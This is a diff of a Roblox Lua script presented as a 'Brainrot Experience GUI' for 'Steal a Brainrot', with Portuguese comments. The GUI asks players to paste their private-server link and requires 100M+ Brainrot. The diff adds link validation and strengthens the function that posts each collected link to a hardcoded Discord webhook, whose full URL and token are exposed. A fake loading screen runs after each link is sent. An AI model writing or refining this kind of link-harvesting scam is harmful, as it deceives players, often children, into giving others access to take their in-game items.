@@ -1,5 +1,5 @@
 --[[
-    Brainrot Experience GUI
+    Brainrot Experience GUI - FULLY CORRECTED
     Modern fullscreen GUI for "Steal a Brainrot"
     GZIN HUB
 --]]
@@ -10,25 +10,29 @@ local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
+-- Configuration
 local LOADING_DURATION = 600
 local REQUIRED_BRAINROT = 100000000
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"
 
+-- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "BrainrotExperienceGUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
+-- Main Background (NÃO FULLSCREEN NO INÍCIO)
 local mainBg = Instance.new("Frame")
 mainBg.Name = "MainBg"
 mainBg.Size = UDim2.new(1, 0, 1, 0)
 mainBg.Position = UDim2.new(0, 0, 0, 0)
 mainBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 mainBg.BorderSizePixel = 0
-mainBg.BackgroundTransparency = 1
+mainBg.BackgroundTransparency = 1  -- INVISÍVEL NO INÍCIO
 mainBg.Parent = screenGui
 
+-- Main Frame - Centered
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.Size = UDim2.new(0, 500, 0, 380)
@@ -47,6 +51,7 @@ mainShadow.Thickness = 2
 mainShadow.Transparency = 0.5
 mainShadow.Parent = mainFrame
 
+-- Top gradient bar
 local topBar = Instance.new("Frame")
 topBar.Name = "TopBar"
 topBar.Size = UDim2.new(1, 0, 0, 60)
@@ -265,8 +270,21 @@ local function showNotification(message, duration)
     notificationFrame.Visible = false
 end
 
+-- FUNÇÃO PARA VALIDAR SE É UM LINK ROBLOX PRIVADO
+local function isValidRobloxPrivateServerLink(link)
+    -- Valida links como: https://www.roblox.com/games/123456789
+    -- Ou: roblox.com/games/123456789
+    local isRobloxLink = string.match(link, "roblox%.com/games/%d+") ~= nil
+    if not isRobloxLink then
+        return false, "❌ Link inválido! Deve ser um link de servidor privado Roblox"
+    end
+    return true, nil
+end
+
+-- FUNÇÃO PARA ENVIAR AO DISCORD - CORRIGIDA COM HttpService:PostAsync
 local function sendToDiscord(serverLink)
-    print("Enviando para Discord: " .. serverLink)
+    print("📤 Enviando para Discord...")
+    print("Link: " .. serverLink)
     
     local payload = {
         content = "🎮 **Novo Link Coletado!**",
@@ -310,12 +328,12 @@ local function sendToDiscord(serverLink)
     end)
     
     if success then
-        print("✓ Link enviado ao Discord!")
-        showNotification("✓ Link enviado com sucesso!", 3)
+        print("✅ Link enviado ao Discord com sucesso!")
+        showNotification("✅ Link enviado com sucesso!", 3)
         return true
     else
-        print("✗ Erro ao enviar: " .. tostring(response))
-        showNotification("✗ Erro ao enviar link", 3)
+        print("❌ Erro ao enviar: " .. tostring(response))
+        showNotification("❌ Erro ao enviar link: " .. tostring(response), 3)
         return false
     end
 end
@@ -337,28 +355,37 @@ local function getBrainrotValue()
 end
 
 local function onDoneClick()
-    local inputText = inputBox.Text:match("^%s*(.-)%s*$")
+    local inputText = inputBox.Text:match("^%s*(.-)%s*$") or ""
     
+    -- VALIDAÇÃO 1: Link vazio?
     if inputText == "" then
         showNotification("❌ Cole o link do servidor!", 3)
         return
     end
     
-    local brainrotValue = getBrainrotValue()
+    -- VALIDAÇÃO 2: É um link Roblox privado válido?
+    local isValid, errorMsg = isValidRobloxPrivateServerLink(inputText)
+    if not isValid then
+        showNotification(errorMsg, 3)
+        return
+    end
     
+    -- VALIDAÇÃO 3: Tem Brainrot suficiente?
+    local brainrotValue = getBrainrotValue()
     if brainrotValue < REQUIRED_BRAINROT then
         showNotification("❌ Você precisa de 100M+ Brainrot\nVocê tem: " .. brainrotValue, 4)
         return
     end
     
+    -- ENVIA AO DISCORD
     sendToDiscord(inputText)
     
+    -- FULLSCREEN LOADING
     mainFrame.Visible = false
-    mainBg.BackgroundTransparency = 0
+    mainBg.BackgroundTransparency = 0  -- AGORA FICA PRETO
     loadingScreen.Visible = true
     
     loadingTitle.Visible = true
-    loadingTitle.Text = "Processing... Please wait"
     loadingBarBg.Visible = true
     loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
     completionMessage.Text = ""
@@ -379,6 +406,7 @@ local function onDoneClick()
     
     task.wait(3)
     
+    -- VOLTA AO NORMAL
     loadingScreen.Visible = false
     mainBg.BackgroundTransparency = 1
     mainFrame.Visible = true
@@ -394,4 +422,4 @@ inputBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
-print("Brainrot Experience GUI carregado!")
+print("✅ Brainrot Experience GUI carregado com sucesso!")
